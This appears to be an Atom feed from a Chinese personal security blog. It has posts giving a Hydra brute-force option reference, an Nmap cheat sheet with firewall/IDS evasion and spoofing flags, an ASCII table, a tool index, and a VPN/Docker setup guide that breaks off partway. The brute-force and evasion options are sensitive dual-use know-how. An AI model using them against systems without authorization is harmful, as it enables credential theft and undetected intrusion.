<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>T0mmclancy`s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://clancyb00m.github.io/"/>
  <updated>2018-12-30T11:06:05.698Z</updated>
  <id>https://clancyb00m.github.io/</id>
  
  <author>
    <name>clancy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>暴力破解工具合辑</title>
    <link href="https://clancyb00m.github.io/2018/12/30/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7%E5%90%88%E8%BE%91/"/>
    <id>https://clancyb00m.github.io/2018/12/30/暴力破解工具合辑/</id>
    <published>2018-12-30T09:03:00.000Z</published>
    <updated>2018-12-30T11:06:05.698Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">-R</span><br><span class="line">继续从上一次的进度开始破解</span><br><span class="line">-S</span><br><span class="line">大写，采用SSL链接</span><br><span class="line">-s&lt;PORT&gt;</span><br><span class="line">小写，可通过这个参数指定非默认端口</span><br><span class="line"></span><br><span class="line">-l&lt;LOGIN&gt;</span><br><span class="line">指定破解的用户，对特定用户破解</span><br><span class="line"></span><br><span class="line">-L&lt;FILE&gt;</span><br><span class="line">指定用户名字典</span><br><span class="line"></span><br><span class="line">-p&lt;PASS&gt;</span><br><span class="line">小写，指定密码破解，少用，一般是采用密码字典</span><br><span class="line"></span><br><span class="line">-P&lt;FILE&gt;</span><br><span class="line">大写，指定密码字典</span><br><span class="line"></span><br><span class="line">-e&lt;ns&gt;</span><br><span class="line">可选选项，n：空密码试探，s：使用指定用户和密码试探</span><br><span class="line"></span><br><span class="line">-C&lt;FILE&gt;</span><br><span class="line">使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数</span><br><span class="line"></span><br><span class="line">-M&lt;FILE&gt;</span><br><span class="line">指定目标列表文件一行一条</span><br><span class="line"></span><br><span class="line">-o&lt;FILE&gt;</span><br><span class="line">指定结果输出文件</span><br><span class="line"></span><br><span class="line">-f</span><br><span class="line">在使用-M参数以后，找到第一对登录名或者密码的时候中止破解</span><br><span class="line"></span><br><span class="line">-t&lt;TASKS&gt;</span><br><span class="line">同时运行的线程数，默认为16</span><br><span class="line"></span><br><span class="line">-w&lt;TIME&gt;</span><br><span class="line">设置最大超时的时间，单位秒，默认是30s</span><br><span class="line"></span><br><span class="line">-v /-V</span><br><span class="line">显示详细过程</span><br><span class="line"></span><br><span class="line">server</span><br><span class="line">目标ip</span><br><span class="line"></span><br><span class="line">service</span><br><span class="line">指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm]imap[-ntlm] smb </span><br><span class="line">smbnt http[s]-&#123;head|get&#125; http-&#123;get|post&#125;-form http-proxy </span><br><span class="line">ciscocisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener </span><br><span class="line">postgres nntp socks5rexec rlogin pcnfs snmp rsh cvs svn icq </span><br><span class="line">sapr3 ssh2 smtp-auth[-ntlm] pcanywhereteamspeak sip vmauthd </span><br><span class="line">firebird ncp afp等等</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://blog.csdn.net/zhaohongjuan/article/details/53838405" target="_blank" rel="noopener">暴力破解工具Hydra</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Hydra&quot;&gt;&lt;a href=&quot;#Hydra&quot; class=&quot;headerlink&quot; title=&quot;Hydra&quot;&gt;&lt;/a&gt;Hydra&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;
      
    
    </summary>
    
    
      <category term="hydra" scheme="https://clancyb00m.github.io/tags/hydra/"/>
    
  </entry>
  
  <entry>
    <title>NMAP速查手册</title>
    <link href="https://clancyb00m.github.io/2018/12/30/NMAP%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/"/>
    <id>https://clancyb00m.github.io/2018/12/30/NMAP速查手册/</id>
    <published>2018-12-30T08:20:00.000Z</published>
    <updated>2018-12-30T11:05:39.441Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><blockquote><p> -sT     TCP connect()扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。<br>-sP     ping扫描，加上这个参数会使用ping扫描，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。<br>-sS     半开扫描，一般不会记入日志，不过需要root权限。<br>-sU     udp扫描，但是一般不可靠，<br>-sA     用来穿过防火墙的规则集，速度慢。<br>-sV     端口服务及版本<br>-A     包含了-sV，-O，全面系统检测，启动脚本检测，扫描等。<br>-P0     扫描之前不使用ping，适用于防火墙禁止ping，比较有用。<br>-v     显示扫描进程<br>-O     探测目标系统的漏洞，容易误报<br>-oN/-oX/-oG     将报告写入文件，格式分别为正常（自定义.txt）,XML,grepable.<br>-iL     扫描主机列表<br>-sC   –script=default   默认的脚本扫描，主要是搜集各种应用服务的信息</p></blockquote><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><blockquote><p>  -sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描<br>-sn                     ping扫描,即主机发现<br>-Pn                     不检测主机存活<br>-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping发现<br>-PE/PP/PM               使用ICMP echo, timestamp and netmask 请求包发现主机<br>-PO[prococol list]      使用IP协议包探测对方主机是否开启<br>-n/-R                   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析</p></blockquote><h3 id="扫描技巧"><a href="#扫描技巧" class="headerlink" title="扫描技巧"></a>扫描技巧</h3><blockquote><p>  -sS/sT/sA/sW/sM                 TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描<br>-sU                             UDP扫描<br>-sN/sF/sX                       TCP Null，FIN，and Xmas扫描<br>–scanflags                     自定义TCP包中的flags<br>-sI zombie host[:probeport]     Idlescan<br>-sY/sZ                          SCTP INIT/COOKIE-ECHO 扫描<br>-sO                             使用IP protocol 扫描确定目标机支持的协议类型<br>-b “FTP relay host”             使用FTP bounce scan</p></blockquote><h3 id="指定端口和扫描顺序"><a href="#指定端口和扫描顺序" class="headerlink" title="指定端口和扫描顺序"></a>指定端口和扫描顺序</h3><blockquote><p>  -p                      特定的端口 -p80,443 或者 -p1-65535<br>-p U:PORT               扫描udp的某个端口, -p U:53<br>-F                      快速扫描模式,比默认的扫描端口还少<br>-r                      不随机扫描端口,默认是随机扫描的<br>–top-ports “number”    扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个<br>–port-ratio “ratio”    扫描指定频率以上的端口</p></blockquote><h3 id="服务版本识别"><a href="#服务版本识别" class="headerlink" title="服务版本识别"></a>服务版本识别</h3><blockquote><p>  -sV                             开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测<br>–version-intensity “level”     设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7<br>–version-light                 打开轻量级模式,为–version-intensity 2的别名<br>–version-all                   尝试所有探测,为–version-intensity 9的别名<br>–version-trace                 显示出详细的版本侦测过程信息</p></blockquote><h3 id="脚本扫描"><a href="#脚本扫描" class="headerlink" title="脚本扫描"></a>脚本扫描</h3><blockquote><p>  -sC                             根据端口识别的服务,调用默认脚本<br>–script=”Lua scripts”          调用的脚本名<br>–script-args=n1=v1,[n2=v2]     调用的脚本传递的参数<br>–script-args-file=filename     使用文本传递参数<br>–script-trace                  显示所有发送和接收到的数据<br>–script-updatedb               更新脚本的数据库<br>–script-help=”Lua script”      显示指定脚本的帮助</p></blockquote><h3 id="OS识别"><a href="#OS识别" class="headerlink" title="OS识别"></a>OS识别</h3><blockquote><p>  -O              启用操作系统检测,-A来同时启用操作系统检测和版本检测<br>–osscan-limit  针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)<br>–osscan-guess  推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配</p></blockquote><h3 id="防火墙-IDS躲避和哄骗"><a href="#防火墙-IDS躲避和哄骗" class="headerlink" title="防火墙/IDS躲避和哄骗"></a>防火墙/IDS躲避和哄骗</h3><blockquote><p>  -f; –mtu value                 指定使用分片、指定数据包的MTU.<br>-D decoy1,decoy2,ME             使用诱饵隐蔽扫描<br>-S IP-ADDRESS                   源地址欺骗<br>-e interface                    使用指定的接口<br>-g/ –source-port PROTNUM       使用指定源端口<br>–proxies url1,[url2],…       使用HTTP或者SOCKS4的代理 </p></blockquote><p>–data-length NUM               填充随机数据让数据包长度达到NUM<br>–ip-options OPTIONS            使用指定的IP选项来发送数据包<br>–ttl VALUE                     设置IP time-to-live域<br>–spoof-mac ADDR/PREFIX/VEBDOR  MAC地址伪装<br>–badsum                        使用错误的checksum来发送数据包</p><h3 id="Nmap-输出"><a href="#Nmap-输出" class="headerlink" title="Nmap 输出"></a>Nmap 输出</h3><blockquote><p>  -oN                     将标准输出直接写入指定的文件<br>-oX                     输出xml文件<br>-oS                     将所有的输出都改为大写<br>-oG                     输出便于通过bash或者perl处理的格式,非xml<br>-oA BASENAME            可将扫描结果以标准格式、XML格式和Grep格式一次性输出<br>-v                      提高输出信息的详细度<br>-d level                设置debug级别,最高是9<br>–reason                显示端口处于带确认状态的原因<br>–open                  只输出端口状态为open的端口<br>–packet-trace          显示所有发送或者接收到的数据包<br>–iflist                显示路由信息和接口,便于调试<br>–log-errors            把日志等级为errors/warings的日志输出<br>–append-output         追加到指定的文件<br>–resume FILENAME       恢复已停止的扫描<br>–stylesheet PATH/URL   设置XSL样式表，转换XML输出<br>–webxml                从namp.org得到XML的样式<br>–no-sytlesheet         忽略XML声明的XSL样式表</p></blockquote><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><blockquote><p>  -6                      开启IPv6<br>-A                      OS识别,版本探测,脚本扫描和traceroute<br>–datedir DIRNAME       说明用户Nmap数据文件位置<br>–send-eth / –send-ip  使用原以太网帧发送/在原IP层发送<br>–privileged            假定用户具有全部权限<br>–unprovoleged          假定用户不具有全部权限,创建原始套接字需要root权限<br>-V                      打印版本信息<br>-h                      输出帮助</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><h3 id="文中内容摘自"><a href="#文中内容摘自" class="headerlink" title="文中内容摘自"></a>文中内容摘自</h3><p><a href="https://wps2015.org/drops/drops/Nmap%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C.html" target="_blank" rel="noopener">Nmap速查手册</a></p><h3 id="Nmap官方中文手册"><a href="#Nmap官方中文手册" class="headerlink" title="Nmap官方中文手册"></a>Nmap官方中文手册</h3><p><a href="http://nmap.org/man/zh/" target="_blank" rel="noopener">Nmap中文手册</a></p><h3 id="Nmap入门"><a href="#Nmap入门" class="headerlink" title="Nmap入门"></a>Nmap入门</h3><p><a href="https://blog.csdn.net/aspirationflow/article/details/7694274" target="_blank" rel="noopener">Nmap扫描原理与用法</a></p><h3 id="简单粗暴获得所有帮助"><a href="#简单粗暴获得所有帮助" class="headerlink" title="简单粗暴获得所有帮助"></a>简单粗暴获得所有帮助</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --help</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;参数&quot;&gt;&lt;a href=&quot;#参数&quot; class=&quot;headerlink&quot; title=&quot;参数&quot;&gt;&lt;/a&gt;参数&lt;/h2&gt;&lt;h3 id=&quot;常用参数&quot;&gt;&lt;a href=&quot;#常用参数&quot; class=&quot;headerlink&quot; title=&quot;常用参数&quot;&gt;&lt;/a&gt;常用参数&lt;/h
      
    
    </summary>
    
    
      <category term="nmap" scheme="https://clancyb00m.github.io/tags/nmap/"/>
    
  </entry>
  
  <entry>
    <title>ASCII对照表</title>
    <link href="https://clancyb00m.github.io/2018/12/30/ASCII%E5%AF%B9%E7%85%A7%E8%A1%A8/"/>
    <id>https://clancyb00m.github.io/2018/12/30/ASCII对照表/</id>
    <published>2018-12-30T08:01:00.000Z</published>
    <updated>2018-12-30T11:05:32.667Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">二十     十六      图形</span><br><span class="line">0010 00003220（空格）(␠)</span><br><span class="line">0010 00013321!</span><br><span class="line">0010 00103422&quot;</span><br><span class="line">0010 00113523#</span><br><span class="line">0010 01003624$</span><br><span class="line">0010 01013725 %</span><br><span class="line">0010 01103826&amp;</span><br><span class="line">0010 01113927&apos;</span><br><span class="line">0010 10004028(</span><br><span class="line">0010 10014129)</span><br><span class="line">0010 1010422A*</span><br><span class="line">0010 1011432B+</span><br><span class="line">0010 1100442C,</span><br><span class="line">0010 1101452D-</span><br><span class="line">0010 1110462E.</span><br><span class="line">0010 1111472F/</span><br><span class="line">0011 000048300</span><br><span class="line">0011 000149311</span><br><span class="line">0011 001050322</span><br><span class="line">0011 001151333</span><br><span class="line">0011 010052344</span><br><span class="line">0011 010153355</span><br><span class="line">0011 011054366</span><br><span class="line">0011 011155377</span><br><span class="line">0011 100056388</span><br><span class="line">0011 100157399</span><br><span class="line">0011 1010583A:</span><br><span class="line">0011 1011593B;</span><br><span class="line">0011 1100603C&lt;</span><br><span class="line">0011 1101613D=</span><br><span class="line">0011 1110623E&gt;</span><br><span class="line">0011 1111633F?</span><br><span class="line">0100 00006440@</span><br><span class="line">0100 00016541A</span><br><span class="line">0100 00106642B</span><br><span class="line">0100 00116743C</span><br><span class="line">0100 01006844D</span><br><span class="line">0100 01016945E</span><br><span class="line">0100 01107046F</span><br><span class="line">0100 01117147G</span><br><span class="line">0100 10007248H</span><br><span class="line">0100 10017349I</span><br><span class="line">0100 1010744AJ</span><br><span class="line">0100 1011754BK</span><br><span class="line">0100 1100764CL</span><br><span class="line">0100 1101774DM</span><br><span class="line">0100 1110784EN</span><br><span class="line">0100 1111794FO</span><br><span class="line">0101 00008050P</span><br><span class="line">0101 00018151Q</span><br><span class="line">0101 00108252R</span><br><span class="line">0101 00118353S</span><br><span class="line">0101 01008454T</span><br><span class="line">0101 01018555U</span><br><span class="line">0101 01108656V</span><br><span class="line">0101 01118757W</span><br><span class="line">0101 10008858X</span><br><span class="line">0101 10018959Y</span><br><span class="line">0101 1010905AZ</span><br><span class="line">0101 1011915B[</span><br><span class="line">0101 1100925C\</span><br><span class="line">0101 1101935D]</span><br><span class="line">0101 1110945E^</span><br><span class="line">0101 1111955F_</span><br><span class="line">0110 00009660`</span><br><span class="line">0110 00019761a</span><br><span class="line">0110 00109862b</span><br><span class="line">0110 00119963c</span><br><span class="line">0110 010010064d</span><br><span class="line">0110 010110165e</span><br><span class="line">0110 011010266f</span><br><span class="line">0110 011110367g</span><br><span class="line">0110 100010468h</span><br><span class="line">0110 100110569i</span><br><span class="line">0110 10101066Aj</span><br><span class="line">0110 10111076Bk</span><br><span class="line">0110 11001086Cl</span><br><span class="line">0110 11011096Dm</span><br><span class="line">0110 11101106En</span><br><span class="line">0110 11111116Fo</span><br><span class="line">0111 000011270p</span><br><span class="line">0111 000111371q</span><br><span class="line">0111 001011472r</span><br><span class="line">0111 001111573s</span><br><span class="line">0111 010011674t</span><br><span class="line">0111 010111775u</span><br><span class="line">0111 011011876v</span><br><span class="line">0111 011111977w</span><br><span class="line">0111 100012078x</span><br><span class="line">0111 100112179y</span><br><span class="line">0111 10101227Az</span><br><span class="line">0111 10111237B&#123;</span><br><span class="line">0111 11001247C|</span><br><span class="line">0111 11011257D&#125;</span><br><span class="line">0111 11101267E~</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
      <category term="ascii" scheme="https://clancyb00m.github.io/tags/ascii/"/>
    
  </entry>
  
  <entry>
    <title>常用工具索引贴</title>
    <link href="https://clancyb00m.github.io/2018/12/30/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%B4%A2%E5%BC%95%E8%B4%B4/"/>
    <id>https://clancyb00m.github.io/2018/12/30/常用工具索引贴/</id>
    <published>2018-12-30T07:29:00.000Z</published>
    <updated>2018-12-30T10:42:42.129Z</updated>
    
    <content type="html"><![CDATA[<p>做这个导航站我只是为了自己方便，放的都是自己喜欢并且常用的工具，初次制作，我自己用着不方便我就删了</p><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><p>待定：<a href="/2018/12/30/NMAP速查手册/">nmap速查手册</a></p><h2 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h2><p>待定：<a href="/2018/12/30/暴力破解工具合辑/#Hydra">hydra常用命令</a></p><h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><p>待定：<a href="">sqlmap常用命令</a></p><h2 id="MD5加解密"><a href="#MD5加解密" class="headerlink" title="MD5加解密"></a>MD5加解密</h2><p><a href="http://www.chamd5.org/" target="_blank" rel="noopener">chamd5</a>、<a href="https://www.cmd5.com/" target="_blank" rel="noopener">cmd5</a>、<a href="https://somd5.com/" target="_blank" rel="noopener">somd5</a></p><h2 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h2><p><a href="http://tool.chinaz.com/tools/urlencode.aspx" target="_blank" rel="noopener">站长之家 </a>、<a href="/2018/12/25/TCPIP协议与HTTP协议/#常用URL编码">常见url编码</a></p><h2 id="ASCII表"><a href="#ASCII表" class="headerlink" title="ASCII表"></a>ASCII表</h2><p><a href="/2018/12/30/ASCII对照表/">ascii对照表</a></p><h2 id="IP定位"><a href="#IP定位" class="headerlink" title="IP定位"></a>IP定位</h2><p><a href="https://met.red/" target="_blank" rel="noopener">遇见</a>、<a href="https://www.ipip.net/ip.html" target="_blank" rel="noopener">IPIP</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;做这个导航站我只是为了自己方便，放的都是自己喜欢并且常用的工具，初次制作，我自己用着不方便我就删了&lt;/p&gt;
&lt;h2 id=&quot;NMAP&quot;&gt;&lt;a href=&quot;#NMAP&quot; class=&quot;headerlink&quot; title=&quot;NMAP&quot;&gt;&lt;/a&gt;NMAP&lt;/h2&gt;&lt;p&gt;待定：&lt;a
      
    
    </summary>
    
    
      <category term="索引,工具" scheme="https://clancyb00m.github.io/tags/%E7%B4%A2%E5%BC%95-%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Windows和Linux下搭建VPN</title>
    <link href="https://clancyb00m.github.io/2018/12/30/Windows%E5%92%8CLinux%E4%B8%8B%E6%90%AD%E5%BB%BAVPN/"/>
    <id>https://clancyb00m.github.io/2018/12/30/Windows和Linux下搭建VPN/</id>
    <published>2018-12-30T06:02:00.000Z</published>
    <updated>2018-12-30T10:47:54.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows-Server-2008"><a href="#Windows-Server-2008" class="headerlink" title="Windows Server 2008"></a>Windows Server 2008</h1><h2 id="安装路由与远程访问"><a href="#安装路由与远程访问" class="headerlink" title="安装路由与远程访问"></a>安装路由与远程访问</h2><p>按照图片上的来，没有截图的界面就选择下一步：</p><p><strong>安装网络策略和访问服务</strong></p><p><img src="/img/vpn/01.png" alt=""></p><p><img src="/img/vpn/02.png" alt=""></p><p><strong>配置并启用路由和远程访问</strong></p><p><img src="/img/vpn/03.png" alt=""></p><p><img src="/img/vpn/04.png" alt=""></p><p><img src="/img/vpn/05.png" alt=""></p><p><img src="/img/vpn/06.png" alt=""></p><p><strong>新增接口</strong></p><p><img src="/img/vpn/07.png" alt=""></p><p><img src="/img/vpn/08.png" alt=""></p><p><img src="/img/vpn/09.png" alt=""></p><h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><p><img src="/img/vpn/10.png" alt=""></p><p>添加用户，自定义名字<code>vpntest</code><br><img src="/img/vpn/11.png" alt=""></p><h2 id="网络安全策略"><a href="#网络安全策略" class="headerlink" title="网络安全策略"></a>网络安全策略</h2><p><img src="/img/vpn/12.png" alt=""></p><p><img src="/img/vpn/13.png" alt=""></p><p><img src="/img/vpn/14.png" alt=""></p><p><img src="/img/vpn/15.png" alt=""></p><p><img src="/img/vpn/16.png" alt=""></p><h2 id="本地安全策略"><a href="#本地安全策略" class="headerlink" title="本地安全策略"></a>本地安全策略</h2><p><img src="/img/vpn/17.png" alt=""></p><p><img src="/img/vpn/18.png" alt=""></p><p><img src="/img/vpn/19.png" alt=""></p><p>输入之前创建用户时的自定义名字<code>vpntest</code><br><img src="/img/vpn/20.png" alt=""></p><h2 id="连接测试"><a href="#连接测试" class="headerlink" title="连接测试"></a>连接测试</h2><p><img src="/img/vpn/21.png" alt=""></p><p><img src="/img/vpn/22.png" alt=""></p><p><img src="/img/vpn/23.png" alt=""></p><p><img src="/img/vpn/24.png" alt=""></p><p>输入创建用户时的用户名和密码：<br><img src="/img/vpn/25.png" alt=""></p><p><img src="/img/vpn/26.png" alt=""></p><p>ok</p><h1 id="Ubuntu-18"><a href="#Ubuntu-18" class="headerlink" title="Ubuntu 18"></a>Ubuntu 18</h1><p>在linux里有一种特别棒的项目，叫docker，功能就相当于VMware workstation，可以安装虚拟镜像，但是docker不对硬件进行虚拟化，所以运行起来会特别的快，关于docker，github上有详细的介绍，易懂，在接下来安装VPN之前，我将先介绍如何安装docker，随后用docker安装VPN</p><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><p>我用的<code>Termius</code>连接的ubuntu，在这里面复制粘贴相对简单</p><p><img src="/img/vpn/termius01.png" alt=""></p><h3 id="更新apt源"><a href="#更新apt源" class="headerlink" title="更新apt源"></a>更新apt源</h3><p>要更新的源的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</span><br></pre></td></tr></table></figure><p>备份原有的源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /etc/apt/sources.list /etc/apt/sources.list.backup</span><br></pre></td></tr></table></figure><p>修改apt源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">打开</span><br><span class="line">vi /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">`dd`删除</span><br><span class="line">复制清华的源放入</span><br><span class="line">保存，退出</span><br></pre></td></tr></table></figure><p>更新</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><h3 id="使用apt安装"><a href="#使用apt安装" class="headerlink" title="使用apt安装"></a>使用apt安装</h3><p>由于 <code>apt</code> 源使用 HTTPS 以确保软件下载过程中不被篡改。因此，我们首先需要添加使用 HTTPS 传输的软件包以及 CA 证书</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure><p>为了确认所下载软件包的合法性，需要添加软件源的 <code>GPG</code> 密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>然后，我们需要向 <code>source.list</code> 中添加 Docker 软件源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line">    &quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \</span><br><span class="line">    $(lsb_release -cs) \</span><br><span class="line">    stable&quot;</span><br></pre></td></tr></table></figure><h3 id="安装-Docker-CE"><a href="#安装-Docker-CE" class="headerlink" title="安装 Docker CE"></a>安装 Docker CE</h3><p>更新 apt 软件包缓存，并安装 <code>docker-ce</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install docker-ce</span><br></pre></td></tr></table></figure><h2 id="镜像加速"><a href="#镜像加速" class="headerlink" title="镜像加速"></a>镜像加速</h2><p>国内从 Docker Hub 拉取镜像有时会遇到困难，此时可以配置镜像加速器。Docker 官方和国内很多云服务商都提供了国内加速器服务</p><h3 id="Ubuntu-16-04-、Debian-8-、CentOS-7"><a href="#Ubuntu-16-04-、Debian-8-、CentOS-7" class="headerlink" title="Ubuntu 16.04+、Debian 8+、CentOS 7"></a>Ubuntu 16.04+、Debian 8+、CentOS 7</h3><p>在 <code>/etc/docker/daemon.json</code> 中写入如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    